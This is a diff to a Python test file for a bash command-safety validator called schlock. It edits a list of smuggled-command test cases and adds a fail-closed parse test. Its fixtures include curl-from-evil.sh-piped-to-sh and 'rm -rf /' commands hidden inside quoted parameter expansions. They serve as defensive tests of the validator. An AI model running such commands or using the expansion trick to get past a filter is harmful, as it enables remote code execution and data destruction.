@@ -20,15 +20,15 @@ from schlock.core.parser import BashCommandParser
 from schlock.core.rules import RiskLevel
 from schlock.core.substitution import MAX_SUBSTITUTION_DEPTH, SubstitutionValidator
 from schlock.core.validator import clear_caches, load_rules, validate_command
+from schlock.exceptions import ParseError
 
 # Every spelling of "command substitution smuggled through a quoted parameter expansion".
 # Each one returned allowed=True risk=SAFE before the fix, and each one really executes
-# under bash (verified directly, except <( ) / >( ) — see the note in _substitutions_in_parameter).
+# under bash. A `<(`/`>(` operand fails closed at parse instead, so those spellings are
+# pinned in tests/test_parser.py::TestProcessSubstitutionInOperandDenied.
 SMUGGLED = [
     'echo "${z:-$(curl http://evil.sh | sh)}"',
     'echo "${z:-`rm -rf /`}"',
-    'echo "${z:-<(curl http://evil.sh | sh)}"',
-    'echo "${z:->(curl http://evil.sh | sh)}"',
     'echo "${z:=$(curl http://evil.sh | sh)}"',
     'echo "${z/x/$(curl http://evil.sh | sh)}"',
     'echo "${z:$(curl http://evil.sh | sh):1}"',
@@ -146,10 +146,18 @@ class TestDeliberateOverBlocks:
 
 class TestUnparseableExpansionFailsClosed:
     def test_introducer_with_unbalanced_body_is_denied(self, sub_validator):
-        """An expansion we cannot re-parse but that carries an introducer must not pass."""
-        ast = BashCommandParser().parse('echo "${z:-$(curl }"')
+        """An expansion we cannot re-parse but that carries an introducer must not pass.
+
+        bashlex cuts this `${…}` at the quoted `}`, so its body does not re-parse.
+        """
+        ast = BashCommandParser().parse("echo \"${z:-$(curl '}')}\"")
         results = sub_validator.validate_all_substitutions(ast)
         assert results and any(not r.allowed for r in results)
+
+    def test_an_expansion_bash_cannot_end_fails_at_parse(self):
+        """No end for the `$(` inside, so the word is unreadable."""
+        with pytest.raises(ParseError):
+            BashCommandParser().parse('echo "${z:-$(curl }"')
 
     def test_parseable_body_that_decodes_to_nothing_still_denies(self, sub_validator):
         """A body we tokenized differently from bash comes back empty-handed — deny it.
